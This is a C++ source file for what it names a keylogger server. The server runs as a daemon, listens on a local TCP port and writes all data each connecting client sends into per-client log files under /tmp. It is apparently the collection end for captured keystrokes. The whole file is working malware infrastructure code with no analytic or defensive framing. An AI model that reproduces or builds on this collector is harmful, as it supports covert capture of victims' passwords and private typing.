#include "server.hpp"
#include "daemon.hpp"
#include <iostream>
#include <exception>

Server::Server(int port)
    : port_(port)
    , running_(false)
{}

Server::~Server() {
    stop();
}

bool Server::start() {
    if (!daemonize("keylogger_server.log")) {
        std::cerr << "Failed to daemonize server" << std::endl;
        return false;
    }
    try {
        server_socket_.set_reuse_address(true);
        server_socket_.bind("127.0.0.1", static_cast<uint16_t>(port_));
        server_socket_.listen(10);
        running_ = true;
        thread_ = std::thread(&Server::run, this);
    } catch (const std::exception& e) {
        std::cerr << "Server error: " << e.what() << std::endl;
        return false;
    }
    return true;
}

void Server::stop() {
    running_ = false;
    server_socket_.close();

    if (thread_.joinable()) {
        thread_.join();
    }
    {
        std::lock_guard<std::mutex> lock(mutex_);
        for (auto& kv : client_files_) {
            if (kv.second && kv.second->is_open()) {
                kv.second->close();
                delete kv.second;
                kv.second = nullptr;
            }
        }
        client_files_.clear();
    }
}

void Server::run() {
    while (running_) {
        try {
            std::string address;
            uint16_t port = 0;
            TCPSocket client_socket = server_socket_.accept(address, port);
            std::thread(&Server::handle_client, this, std::move(client_socket), address, port).detach();
        } catch (const std::exception& e) {
            if (running_) {
                std::cerr << "Server could not accept client: " << e.what() << std::endl;
            }
        }
    }
}

void Server::handle_client(TCPSocket client_socket, const std::string& address, int port) {
    std::string client_key = address + ":" + std::to_string(port);
    std::ofstream* ofs_ptr = nullptr;
    {
        std::lock_guard<std::mutex> lock(mutex_);
        auto it = client_files_.find(client_key);
        if (it == client_files_.end()) {
            std::string path = "/tmp/client_" + address + "_" + std::to_string(port) + ".log";
            ofs_ptr = new std::ofstream(path, std::ios::app);
            client_files_[client_key] = ofs_ptr;
        } else {
            ofs_ptr = it->second;
        }
    }

    if (!ofs_ptr || !ofs_ptr->is_open()) {
        std::cerr << "Failed to open log file for client " << client_key << std::endl;
        client_socket.close();
        return;
    }

    char buffer[MAX_BUFFER_SIZE];
    while (running_) {
        try {
            size_t received = client_socket.receive(buffer, sizeof(buffer));
            if (received == 0) {
                break;
            }
            ofs_ptr->write(buffer, received);
            ofs_ptr->flush();
        } catch (const std::exception& e) {
            std::cerr << "Error while receiving data from client " << client_key << ": " << e.what() << std::endl;
            break;
        }
    }
    client_socket.close();
    std::cerr << "Client disconnected: " << client_key << std::endl;
}
